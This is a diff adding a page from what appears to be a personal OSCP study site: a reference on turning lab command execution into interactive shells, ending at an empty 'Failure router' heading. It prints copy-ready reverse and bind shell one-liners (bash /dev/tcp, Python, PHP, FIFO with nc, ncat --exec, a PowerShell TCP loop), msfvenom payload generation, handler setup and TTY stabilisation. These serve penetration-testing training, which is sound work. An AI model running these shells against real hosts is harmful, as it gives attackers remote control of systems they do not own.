@@ -1,0 +1,554 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="generator" content="Astro v7.2.0"><meta name="description" content="Commands, variants, interpretation and next actions for Shells, Payloads and Session Repair."><meta name="theme-color" content="#121414"><link rel="canonical" href="https://armaanleg3nd.github.io/tools/oscp/reference/04-shells-transfers-credentials/02-shells-and-payloads/"><link rel="icon" href="/favicon.svg" type="image/svg+xml"><meta property="og:title" content="Shells, Payloads and Session Repair | OSCP reference | Armaan"><meta property="og:description" content="Commands, variants, interpretation and next actions for Shells, Payloads and Session Repair."><meta property="og:type" content="website"><meta property="og:url" content="https://armaanleg3nd.github.io/tools/oscp/reference/04-shells-transfers-credentials/02-shells-and-payloads/"><title>Shells, Payloads and Session Repair | OSCP reference | Armaan</title><meta name="astro-view-transitions-enabled" content="true"><meta name="astro-view-transitions-fallback" content="swap"><script type="module" src="/_assets/ClientRouter.astro_astro_type_script_index_0_lang.xc6nT38P.js"></script><link rel="stylesheet" href="/_assets/BaseLayout.C8rLAhpp.css"><link rel="stylesheet" href="/_assets/ToolLayout.Bh0Ez8ox.css"><style>.full-reference{max-width:1420px;color:var(--text);margin:auto;padding:2rem clamp(1rem,4vw,4rem) 5rem}.full-reference a{color:var(--cyan-soft)}.full-reference h1{margin:1.25rem 0;font-size:clamp(1.7rem,3vw,2.5rem);line-height:1.2}.full-reference p{color:var(--muted);max-width:80ch;line-height:1.8}.reference-find{gap:.6rem;max-width:44rem;margin:1.5rem 0;font-size:.85rem;display:grid}.reference-find input{border:1px solid var(--line-strong);background:var(--surface-low);color:var(--text);border-radius:3px;padding:.8rem}.reference-index{grid-template-columns:repeat(2,minmax(0,1fr));gap:2rem;display:grid}.reference-index section{min-width:0}.reference-index h2{text-transform:capitalize;border-bottom:1px solid var(--line);padding-bottom:.7rem;font-size:1.2rem}.reference-index h3{margin:1.3rem 0 .5rem;font-size:1rem}.reference-index ul{padding-left:1.2rem;font-size:.84rem;line-height:1.9}.reference-index .level-3{color:var(--muted);margin-left:1rem;font-size:.76rem}.reference-index [hidden]{display:none}.reference-reading{grid-template-columns:240px minmax(0,1fr);gap:2.5rem;display:grid}.reference-reading nav{top:calc(var(--header-height) + 1rem);max-height:calc(100dvh - var(--header-height) - 2rem);border-right:1px solid var(--line);align-self:start;padding:1rem;font-size:.76rem;position:sticky;overflow:auto}.reference-reading nav ul{padding:0;list-style:none}.reference-reading nav li{margin:.7rem 0;line-height:1.5}.reference-reading nav .level-3{padding-left:1rem;font-size:.7rem}.reference-prose{min-width:0;line-height:1.85}.reference-prose :is(h1,h2,h3,h4){scroll-margin-top:calc(var(--header-height) + 1.5rem);margin:2rem 0 1rem;line-height:1.35}.reference-prose h2{border-top:1px solid var(--line);padding-top:1.5rem;font-size:1.35rem}.reference-prose h3{font-size:1.05rem}.reference-prose pre{border:1px solid var(--line);background:var(--surface-low);max-width:100%;font:.8rem/1.75 var(--mono);border-radius:3px;padding:2.5rem 1rem 1rem;position:relative;overflow:auto}.reference-prose [data-reference-copy]{border:1px solid var(--line);color:var(--cyan-soft);font:.65rem var(--mono);cursor:pointer;background:0 0;padding:.2rem .5rem;position:absolute;top:.4rem;right:.5rem}.reference-prose code{overflow-wrap:anywhere;font-size:.85em}.reference-prose pre code{overflow-wrap:normal;font-size:inherit}.reference-prose blockquote{border-left:2px solid var(--cyan);color:var(--muted);margin:1.25rem 0;padding-left:1rem}.reference-prose table{border-collapse:collapse;max-width:100%;font-size:.8rem;display:block;overflow:auto}.reference-prose :is(td,th){border:1px solid var(--line);text-align:left;padding:.6rem}.reference-prose img{max-width:100%;height:auto}.reference-prose details{border-top:1px solid var(--line);padding:.8rem 0}.reference-prose summary{cursor:pointer;color:var(--cyan-soft)}@media (width<=850px){.reference-index,.reference-reading{grid-template-columns:1fr}.reference-reading nav{border:1px solid var(--line);max-height:18rem;position:static}.full-reference{padding-top:1rem}}
+</style><style>[data-astro-transition-scope="astro-nfpogox7-1"] { view-transition-name: page-content; }@layer astro { ::view-transition-old(page-content) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }::view-transition-new(page-content) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back]::view-transition-old(page-content) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back]::view-transition-new(page-content) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; } }[data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-nfpogox7-1"],
+			[data-astro-transition-fallback="old"][data-astro-transition-scope="astro-nfpogox7-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-nfpogox7-1"],
+			[data-astro-transition-fallback="new"][data-astro-transition-scope="astro-nfpogox7-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back][data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-nfpogox7-1"],
+			[data-astro-transition=back][data-astro-transition-fallback="old"][data-astro-transition-scope="astro-nfpogox7-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back][data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-nfpogox7-1"],
+			[data-astro-transition=back][data-astro-transition-fallback="new"][data-astro-transition-scope="astro-nfpogox7-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }</style></head><body><a class="skip-link" href="#main-content">Skip to content</a><header class="site-header" data-astro-cid-wpvy4v7s><nav class="site-nav" aria-label="Primary navigation" data-astro-cid-wpvy4v7s><a class="brand" href="/" aria-label="leg3nd home" data-astro-cid-wpvy4v7s><span data-astro-cid-wpvy4v7s>leg3nd</span><small data-astro-cid-wpvy4v7s>Projects &amp; tools</small></a><button class="nav-toggle" type="button" aria-expanded="false" aria-controls="nav-links" data-astro-cid-wpvy4v7s><span data-astro-cid-wpvy4v7s>MENU</span><span class="nav-toggle__glyph" aria-hidden="true" data-astro-cid-wpvy4v7s>[+]</span></button><div class="nav-links" id="nav-links" data-astro-cid-wpvy4v7s><a href="/" data-astro-cid-wpvy4v7s><span class="nav-index" data-astro-cid-wpvy4v7s>01</span>Home</a><a href="/projects/" data-astro-cid-wpvy4v7s><span class="nav-index" data-astro-cid-wpvy4v7s>02</span>Projects</a><a href="/tools/" class="active" aria-current="page" data-astro-cid-wpvy4v7s><span class="nav-index" data-astro-cid-wpvy4v7s>03</span>Tools</a></div><div class="system-state" aria-label="Timezone" data-astro-cid-wpvy4v7s>GMT+8</div></nav></header><script type="module">var e=()=>{let e=document.querySelector(`.nav-toggle`),t=document.querySelector(`.nav-links`);if(!e||!t||e.dataset.bound===`true`)return;e.dataset.bound=`true`;let n=()=>{e.setAttribute(`aria-expanded`,`false`),t.dataset.open=`false`;let n=e.querySelector(`.nav-toggle__glyph`);n&&(n.textContent=`[+]`)};e.addEventListener(`click`,()=>{let n=e.getAttribute(`aria-expanded`)===`true`;e.setAttribute(`aria-expanded`,String(!n)),t.dataset.open=String(!n);let r=e.querySelector(`.nav-toggle__glyph`);r&&(r.textContent=n?`[+]`:`[-]`)}),t.addEventListener(`click`,e=>{e.target.closest(`a`)&&n()}),e.closest(`nav`)?.addEventListener(`keydown`,t=>{t.key===`Escape`&&(n(),e.focus())})};document.addEventListener(`astro:page-load`,e),e();</script><div data-astro-transition-scope="astro-nfpogox7-1" id="main-content"><div class="tools-surface"><main class="full-reference"><p><a href="/tools/oscp/reference/">← Complete task index</a> · <a href="/tools/oscp/">Workspace</a></p><div class="reference-reading"><nav aria-label="On this page"><strong>On this page</strong><ul><li class="level-2"><a href="#keep-four-states-separate">Keep four states separate</a></li><li class="level-2"><a href="#choose-the-access-form">Choose the access form</a></li><li class="level-2"><a href="#map-the-callback-before-generating-anything">Map the callback before generating anything</a></li><li class="level-2"><a href="#listener-baselines-and-netcat-variants">Listener baselines and Netcat variants</a></li><li class="level-2"><a href="#prove-command-execution-before-requesting-a-shell">Prove command execution before requesting a shell</a></li><li class="level-2"><a href="#linux-reverse-shell-baselines">Linux reverse-shell baselines</a></li><li class="level-2"><a href="#windows-session-options">Windows session options</a></li><li class="level-2"><a href="#bind-shells">Bind shells</a></li><li class="level-2"><a href="#generate-payloads-after-selecting-context">Generate payloads after selecting context</a></li><li class="level-3"><a href="#staged-versus-stageless">Staged versus stageless</a></li><li class="level-3"><a href="#existing-poc-payload-constraints">Existing-PoC payload constraints</a></li><li class="level-2"><a href="#diagnose-quoting-and-encoding-by-layer">Diagnose quoting and encoding by layer</a></li><li class="level-2"><a href="#diagnose-a-missing-callback-in-order">Diagnose a missing callback in order</a></li><li class="level-2"><a href="#handle-security-control-evidence-proportionately">Handle security-control evidence proportionately</a></li><li class="level-2"><a href="#stabilize-a-linux-tty">Stabilize a Linux TTY</a></li><li class="level-2"><a href="#verify-every-new-session">Verify every new session</a></li><li class="level-2"><a href="#failure-router">Failure router</a></li><li class="level-2"><a href="#exam-boundary">Exam boundary</a></li><li class="level-2"><a href="#powercat--windows-powershell-shell-transport">Powercat — Windows PowerShell shell transport</a></li><li class="level-2"><a href="#penelope-or-pwncat-cs--handle-an-existing-shell-and-move-files">Penelope or pwncat-cs — handle an existing shell and move files</a></li><li class="level-2"><a href="#keep-listeners-and-long-running-checks-in-tmux">Keep listeners and long-running checks in tmux</a></li><li class="level-2"><a href="#aspx-handler-check-before-generating-a-windows-payload">ASPX handler check before generating a Windows payload</a></li><li class="level-2"><a href="#shell-alternatives-when-the-installed-runtime-changes">Shell alternatives when the installed runtime changes</a></li><li class="level-2"><a href="#openssl-transport-when-a-tls-callback-is-useful">OpenSSL transport when a TLS callback is useful</a></li><li class="level-2"><a href="#sources">Sources</a></li></ul></nav><article class="reference-prose"><h1 id="shells-payloads-and-session-repair">Shells, Payloads and Session Repair</h1>
+<p><a href="https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/reference/04-shells-transfers-credentials/README.md">← Stage index</a> | <a href="/tools/oscp/reference/03-initial-access/06-public-exploit-adaptation/">Public-exploit adaptation</a> | <a href="/tools/oscp/reference/04-shells-transfers-credentials/01-file-transfer/">File transfer</a> | <a href="/tools/oscp/reference/04-shells-transfers-credentials/06-payload-execution-obstacles/">Payload obstacles</a> | <a href="https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/cheatsheets/shells-payloads.md">Shell cheatsheet</a> | <a href="https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/notes/Attack_Strategy_Map.md">Strategy map</a> | Study methods: <a href="https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/notes/methods/sessions-transfers.md">Establish sessions and move files</a>; <a href="https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/notes/methods/execution.md">Resolve payload execution obstacles</a></p>
+<blockquote>
+<p><strong>Goal:</strong> turn verified command execution into a session whose execution, transport and interaction properties are understood. Every command is a generic authorized-lab reference, not a target assignment.</p>
+</blockquote>
+<h2 id="keep-four-states-separate">Keep four states separate</h2>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-text">delivery → execution → connection → usable session
+</code></pre>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>State</th><th>Decisive evidence</th><th>Does not yet prove</th></tr></thead><tbody><tr><td>Delivery</td><td>Exact bytes/request reached intended consumer</td><td>Payload executed</td></tr><tr><td>Execution</td><td>Harmless command output or controlled side effect</td><td>Network callback works</td></tr><tr><td>Connection</td><td>Listener records the expected peer</td><td>Commands and I/O are usable</td></tr><tr><td>Session</td><td>Commands return and host/identity are verified</td><td>Higher privilege or stability</td></tr></tbody></table>
+<p>Do not change all four layers at once. Preserve the last confirmed state and test the next boundary.</p>
+<h2 id="choose-the-access-form">Choose the access form</h2>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Situation</th><th>Prefer</th><th>Main prerequisite / limitation</th></tr></thead><tbody><tr><td>One bounded action is enough</td><td>Direct command execution</td><td>Observable output or side effect; no shell required</td></tr><tr><td>Valid credential and remote service</td><td>SSH, WinRM or RDP</td><td>Authentication plus remote-logon authorization</td></tr><tr><td>Target can reach Kali</td><td>Reverse shell</td><td>Target egress and a reachable Kali listener</td></tr><tr><td>Kali can reach a target listener</td><td>Bind shell</td><td>Target can bind and inbound path permits it</td></tr><tr><td>Payload is staged or protocol-aware</td><td>Matching framework handler</td><td>Handler must use the exact payload/transport</td></tr></tbody></table>
+<p>Prefer authenticated administrative access when it is already available: it is normally more stable, auditable and feature-complete than an improvised shell.</p>
+<h2 id="map-the-callback-before-generating-anything">Map the callback before generating anything</h2>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-text">trigger context
+→ target process/interpreter and architecture
+→ target source interface
+→ route/egress controls
+→ LHOST address visible from target
+→ LPORT
+→ local bind interface
+→ listener/handler
+</code></pre>
+<p>Select <code>LHOST</code> from the target's point of view. A VPN address, tunnel endpoint or reachable interface may be correct while Kali's default-route address is wrong.</p>
+<p>On Kali:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">ip -brief address
+ip route
+ss -lntp
+</code></pre>
+<p>Windows source/listener checks:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-powershell">Get-NetIPAddress -AddressFamily IPv4
+Get-NetRoute -AddressFamily IPv4
+Get-NetTCPConnection -State Listen
+</code></pre>
+<h2 id="listener-baselines-and-netcat-variants">Listener baselines and Netcat variants</h2>
+<p>Traditional/OpenBSD-style <code>nc</code> commonly used on Kali:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">rlwrap nc -lvnp LPORT
+</code></pre>
+<p>Nmap Ncat uses a positional listen port; do not mechanically copy every <code>nc</code> flag:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">ncat -4 -lvn 0.0.0.0 LPORT
+</code></pre>
+<p>Verify the bind in another terminal:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">ss -lntp | grep ':LPORT'
+</code></pre>
+<p>If multiple interfaces exist, bind deliberately:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">ncat -4 -lvn LHOST LPORT
+</code></pre>
+<blockquote>
+<p><strong>Failure cue:</strong> a listener bound only to <code>127.0.0.1</code>, the wrong VPN/interface address or the wrong address family cannot receive the expected callback. “Address already in use” means another process owns the bind.</p>
+</blockquote>
+<h2 id="prove-command-execution-before-requesting-a-shell">Prove command execution before requesting a shell</h2>
+<p>Linux:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">id; hostname; pwd
+</code></pre>
+<p>Windows:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-cmd">whoami &#x26; hostname &#x26; cd
+</code></pre>
+<p>For blind execution, use one bounded callback or file side effect that the current context can produce and you can independently observe. Do not interpret a hung HTTP request as proof of a shell; the server may simply be waiting on a child process or timeout.</p>
+<h2 id="linux-reverse-shell-baselines">Linux reverse-shell baselines</h2>
+<p>Choose an interpreter that you confirmed exists.</p>
+<p>Bash TCP:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">bash -c 'bash -i >&#x26; /dev/tcp/LHOST/LPORT 0>&#x26;1'
+</code></pre>
+<p>Python 3 with a PTY:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("LHOST",LPORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
+</code></pre>
+<p>Portable FIFO plus Netcat when <code>-e</code> is absent:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">rm -f /tmp/f; mkfifo /tmp/f
+cat /tmp/f | /bin/sh -i 2>&#x26;1 | nc LHOST LPORT >/tmp/f
+</code></pre>
+<p>PHP CLI:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">php -r '$s=fsockopen("LHOST",LPORT);exec("/bin/sh -i &#x3C;&#x26;3 >&#x26;3 2>&#x26;3");'
+</code></pre>
+<details>
+<summary><strong>Variant — target has Ncat command execution</strong></summary>
+<p>Linux:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">ncat LHOST LPORT --exec /bin/sh
+</code></pre>
+<p>Windows:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-cmd">ncat.exe LHOST LPORT --exec cmd.exe
+</code></pre>
+<p><code>--exec</code> exposes the named program directly to the network connection. Use only on the assigned host and remove transferred tooling when the exercise requires cleanup.</p>
+</details>
+<blockquote>
+<p><strong>Shell-language cue:</strong> a command injection may execute through <code>/bin/sh</code>, which does not understand every Bash construct. Wrap Bash-specific syntax in <code>bash -c '...'</code> and then encode it for the outer HTTP/template/database layer.</p>
+</blockquote>
+<h2 id="windows-session-options">Windows session options</h2>
+<p>Prefer an available authenticated service:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">evil-winrm -i TARGET -u USER -p 'PASSWORD'
+xfreerdp /v:TARGET /u:'DOMAIN\USER' /p:'PASSWORD' /cert:ignore
+ssh -p PORT USER@TARGET
+</code></pre>
+<p>PowerShell TCP shell when direct command execution is the only primitive:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-powershell">$client = [Net.Sockets.TcpClient]::new('LHOST',LPORT)
+$stream = $client.GetStream()
+$buffer = New-Object byte[] 65535
+while (($count = $stream.Read($buffer,0,$buffer.Length)) -gt 0) {
+  $command = [Text.Encoding]::ASCII.GetString($buffer,0,$count)
+  $output = (Invoke-Expression $command 2>&#x26;1 | Out-String) + "PS $((Get-Location).Path)> "
+  $bytes = [Text.Encoding]::ASCII.GetBytes($output)
+  $stream.Write($bytes,0,$bytes.Length)
+  $stream.Flush()
+}
+$client.Close()
+</code></pre>
+<blockquote>
+<p>This is a basic command channel, not a ConPTY. Host policy, language mode, AMSI/antimalware, quoting and the parent process can affect it.</p>
+</blockquote>
+<p>PowerShell <code>-EncodedCommand</code> solves nested quoting; it is not encryption or an AV bypass. Generate UTF-16LE Base64 locally:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-powershell">$command = 'COMMAND'
+$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command))
+$encoded
+</code></pre>
+<p>Invoke in the target command context:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-cmd">powershell.exe -NoProfile -NonInteractive -EncodedCommand BASE64_UTF16LE
+</code></pre>
+<h2 id="bind-shells">Bind shells</h2>
+<p>Use a bind shell only when Kali can reach a target listener and reverse egress is unavailable.</p>
+<p>Traditional Netcat with <code>-e</code> support on a Linux target:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">nc -lvnp PORT -e /bin/sh
+</code></pre>
+<p>Connect from Kali:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">nc -nv TARGET PORT
+</code></pre>
+<p>FIFO alternative when <code>-e</code> is absent:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">rm -f /tmp/f; mkfifo /tmp/f
+cat /tmp/f | /bin/sh -i 2>&#x26;1 | nc -lvnp PORT >/tmp/f
+</code></pre>
+<p>Ncat target listener:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">ncat -4 -lvn 0.0.0.0 PORT --exec /bin/sh
+</code></pre>
+<blockquote>
+<p>Bind shells expose a target port and may be blocked by the host firewall or upstream ACL. A successful local bind does not prove Kali can reach it.</p>
+</blockquote>
+<h2 id="generate-payloads-after-selecting-context">Generate payloads after selecting context</h2>
+<p>List rather than guess names and formats:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">msfvenom -l payloads | grep -E 'linux|windows' | grep -E 'x64|x86'
+msfvenom --list formats
+msfvenom -p PAYLOAD_NAME --list-options
+</code></pre>
+<p>Stageless command-shell binaries:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">msfvenom -p linux/x64/shell_reverse_tcp \
+  LHOST=LHOST LPORT=LPORT \
+  -f elf -o shell.elf
+
+msfvenom -p windows/x64/shell_reverse_tcp \
+  LHOST=LHOST LPORT=LPORT \
+  -f exe -o shell.exe
+</code></pre>
+<p>Verify the resulting artifacts:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">file shell.elf shell.exe
+sha256sum shell.elf shell.exe
+</code></pre>
+<blockquote>
+<p><code>msfvenom</code> does not make a payload compatible with the delivery path. Match target OS, process architecture, payload type, output format, available execution method and callback route.</p>
+</blockquote>
+<h3 id="staged-versus-stageless">Staged versus stageless</h3>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-text">stageless: complete payload delivered at once; larger, usually simpler and more stable
+staged: small first stage connects and retrieves the rest; smaller initial footprint, needs matching handler and second transfer
+</code></pre>
+<p>Metasploit naming commonly reflects the distinction:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-text">windows/x64/shell_reverse_tcp   stageless
+windows/x64/shell/reverse_tcp   staged
+</code></pre>
+<p>A raw Netcat listener can receive many ordinary stageless command shells. A staged payload normally needs <code>multi/handler</code> configured with the exact same payload:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-text">msfconsole -q
+use exploit/multi/handler
+set payload PAYLOAD_NAME
+set LHOST LHOST
+set LPORT LPORT
+show options
+run
+</code></pre>
+<blockquote>
+<p>A connection to Netcat with no usable commands can mean a staged payload reached a non-staging listener. It is not necessarily failed code execution.</p>
+</blockquote>
+<h3 id="existing-poc-payload-constraints">Existing-PoC payload constraints</h3>
+<p>Only when an existing reviewed PoC documents payload space and bad characters:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">msfvenom -p PAYLOAD_NAME \
+  LHOST=LHOST LPORT=LPORT \
+  -f FORMAT -v VARIABLE \
+  -b 'BAD_CHARACTERS' \
+  -s MAX_SPACE
+</code></pre>
+<p>Encoders and repeated encoding do not guarantee antimalware evasion. <code>-b</code> is for bytes that the vulnerable input path cannot preserve; do not invent a universal bad-character list.</p>
+<h2 id="diagnose-quoting-and-encoding-by-layer">Diagnose quoting and encoding by layer</h2>
+<p>Write the parser chain explicitly:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-text">HTTP/SQL/template parser
+→ application language
+→ command launcher (`system`, `cmd /c`, `/bin/sh -c`, PowerShell)
+→ target shell/interpreter
+→ payload command
+</code></pre>
+<p>Test each layer with a small command. Encode only for the layer that consumes the characters:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">python3 -c 'import urllib.parse; print(urllib.parse.quote("COMMAND"))'
+</code></pre>
+<p>Typical failures:</p>
+<ul>
+<li><code>&#x26;</code>, <code>|</code>, <code>></code>, <code>&#x3C;</code>, <code>$</code>, backticks, quotes or spaces consumed by an outer shell;</li>
+<li>URL decoding occurs zero, one or two times;</li>
+<li>JSON, XML, SQL or template quoting changes the command;</li>
+<li>PowerShell receives UTF-8 Base64 instead of required UTF-16LE;</li>
+<li>payload length exceeds a field, command line or exploit buffer;</li>
+<li>32-bit payload is injected into a 64-bit context or the reverse.</li>
+</ul>
+<h2 id="diagnose-a-missing-callback-in-order">Diagnose a missing callback in order</h2>
+<ol>
+<li><strong>Delivery:</strong> prove the request/file/argument reaches the intended consumer.</li>
+<li><strong>Execution:</strong> prove <code>id</code>/<code>whoami</code>, hostname or a bounded side effect in the exact context.</li>
+<li><strong>Parser:</strong> verify quoting, encoding, interpreter, working directory and length.</li>
+<li><strong>Payload:</strong> confirm OS, architecture, format, staged/stageless type and dependencies.</li>
+<li><strong>Listener:</strong> start it first and verify the bound address and port.</li>
+<li><strong>Route:</strong> test target-to-listener reachability from the execution context.</li>
+<li><strong>Security control:</strong> use concrete errors, quarantine, logs or process behavior.</li>
+<li><strong>Session:</strong> repair TTY, buffering, encoding and job control after connection.</li>
+</ol>
+<p>Target-side route checks where available:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">nc -vz LHOST LPORT
+curl -v --connect-timeout 5 http://LHOST:LPORT/
+</code></pre>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-powershell">Test-NetConnection LHOST -Port LPORT -InformationLevel Detailed
+</code></pre>
+<p>Observe Kali while triggering:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">sudo tcpdump -ni any tcp port LPORT
+</code></pre>
+<p>Interpretation:</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Observation</th><th>Next decision</th></tr></thead><tbody><tr><td>No SYN reaches Kali</td><td>Wrong execution, LHOST, route, egress or earlier parser layer</td></tr><tr><td>SYN arrives; no listener response</td><td>Wrong bind/interface/port or local firewall</td></tr><tr><td>TCP handshake then immediate close</td><td>Payload/handler mismatch, crash or security control</td></tr><tr><td>Connection stays but no commands</td><td>Staged/raw mismatch, buffering or I/O/session issue</td></tr></tbody></table>
+<h2 id="handle-security-control-evidence-proportionately">Handle security-control evidence proportionately</h2>
+<p>Windows Defender status, when the current identity can query it:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-powershell">Get-MpComputerStatus |
+  Select-Object AntivirusEnabled,RealTimeProtectionEnabled,BehaviorMonitorEnabled,IoavProtectionEnabled
+</code></pre>
+<p>Do not label every failure “AV.” Differentiate:</p>
+<ul>
+<li>file never arrived or hashes differ;</li>
+<li>file arrived and disappeared/quarantined;</li>
+<li>process creation was denied;</li>
+<li>script content was blocked;</li>
+<li>process started and exited/crashed;</li>
+<li>callback was blocked after execution;</li>
+<li>application-control or language-mode restrictions;</li>
+<li>ordinary format, architecture, permission or dependency errors.</li>
+</ul>
+<p>Prefer an already available native or authenticated route when it satisfies the objective. Encoding is transport representation, not proof of evasion. Custom shellcode development and deep AV-bypass work are outside this unit.</p>
+<p>For MOTW/Office/Library-file delivery, execution-policy precedence, AMSI/AppLocker/Defender evidence and restricted Metasploit module/session handling, continue with <a href="/tools/oscp/reference/04-shells-transfers-credentials/06-payload-execution-obstacles/">payload execution obstacles</a>.</p>
+<h2 id="stabilize-a-linux-tty">Stabilize a Linux TTY</h2>
+<p>First obtain a PTY with an available interpreter:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">python3 -c 'import pty; pty.spawn("/bin/bash")'
+</code></pre>
+<p>Press <code>Ctrl-Z</code> locally, then:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">stty raw -echo; fg
+</code></pre>
+<p>Back in the remote shell:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">reset
+export TERM=xterm-256color
+stty rows 40 columns 120
+</code></pre>
+<p>If the local terminal becomes unreadable, restore it from a separate/local shell:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">stty sane
+</code></pre>
+<p>Socat can provide a stronger PTY when present on both sides:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash"># Kali
+socat file:$(tty),raw,echo=0 tcp-listen:LPORT,reuseaddr
+
+# Target
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:LHOST:LPORT
+</code></pre>
+<blockquote>
+<p>TTY repair changes terminal behavior, not privilege or network reliability. A PTY may enable job control and programs that require a terminal; it does not turn a fragile route into a stable one.</p>
+</blockquote>
+<h2 id="verify-every-new-session">Verify every new session</h2>
+<p>Linux:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">hostname; id; pwd
+ip addr; ip route
+ss -lntup
+</code></pre>
+<p>Windows:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-cmd">hostname
+whoami /all
+cd
+ipconfig /all
+route print
+netstat -ano
+</code></pre>
+<p>Record the destination host, actual identity, privilege, current directory, interfaces/routes, parent/execution context and the exact command that produced the session. Then re-enumerate from the new state.</p>
+<h2 id="failure-router">Failure router</h2>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
